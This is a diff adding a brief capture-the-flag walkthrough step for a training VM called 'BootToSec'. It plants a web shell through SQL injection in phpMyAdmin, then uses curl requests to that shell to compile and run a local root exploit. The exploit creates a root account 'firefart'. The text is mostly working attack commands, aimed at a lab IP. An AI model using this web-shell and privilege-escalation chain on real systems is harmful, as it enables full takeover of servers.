@@ -1,0 +1,18 @@
+BONUS 3 - Dirty SQL injection.
+
+Repeat Step 1-2.
+
+Copy code from sql_injection.sql to phpMyAdmin panel and run it.
+
+Compile it with GCC and run from Kali with using CURL:
+
+curl --insecure 'https://10.0.2.4/forum/templates_c/hack.php?cmd=gcc%20-pthread%20/var/www/forum/templates_c/exploit.c%20-o%20/var/www/forum/templates_c/exploit%20-lcrypt'
+
+curl --insecure 'https://10.0.2.4/forum/templates_c/hack.php?cmd=ls%20/var/www/forum/templates_c/'	# CHECKING
+
+curl --insecure 'https://10.0.2.4/forum/templates_c/hack.php?cmd=/var/www/forum/templates_c/exploit%20123'
+
+Now target has 'firefart' user with password '123', which is root. 
+Go to target (BootToSec) interface and login.
+
+Jack POT! It's root!
